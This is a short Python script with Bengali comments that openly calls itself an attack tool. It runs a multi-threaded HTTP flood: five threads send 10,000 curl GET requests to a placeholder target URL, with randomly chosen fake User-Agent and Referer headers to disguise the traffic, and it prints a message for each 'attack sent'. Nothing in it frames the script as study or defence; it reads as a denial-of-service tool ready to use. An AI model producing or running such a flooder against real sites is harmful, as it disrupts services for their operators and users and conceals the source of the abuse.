import subprocess
import threading
import time
import random

# ফেক User-Agent হেডার
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; ASL 1.0; ARM; en-US) like Gecko"
]

# ফেক Referer হেডার
referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
]

# ✅ অ্যাটাক ফাংশন
def attack(url, total_requests):
    for _ in range(total_requests):
        try:
            # হেডারস তৈরি
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": random.choice(referers),
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
            }

            # curl কমান্ডে হেডারস যুক্ত করা
            curl_command = ["curl", "-X", "GET", url] + [f"-H {k}: {v}" for k, v in headers.items()]
            result = subprocess.Popen(curl_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # রেসপন্স আনা
            stdout, stderr = result.communicate()

            if result.returncode == 0:
                print(f"🔥 {url} এ অ্যাটাক পাঠানো হয়েছে")
            else:
                print(f"❌ ব্যর্থ: {stderr.decode()}")
            time.sleep(0.5)
        except Exception as e:
            print(f"❌ ব্যর্থ: {e}")

# ✅ মাল্টি-থ্রেডেড অ্যাটাক ফাংশন
def start_attack(url, total_requests, threads):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(url, total_requests // threads))
        thread_list.append(thread)
        thread.start()
    
    for thread in thread_list:
        thread.join()

# ✅ অ্যাটাক চালানো
if __name__ == "__main__":
    target_url = "https://target-website.com"
    total_requests = 10000
    threads = 5
    start_attack(target_url, total_requests, threads)
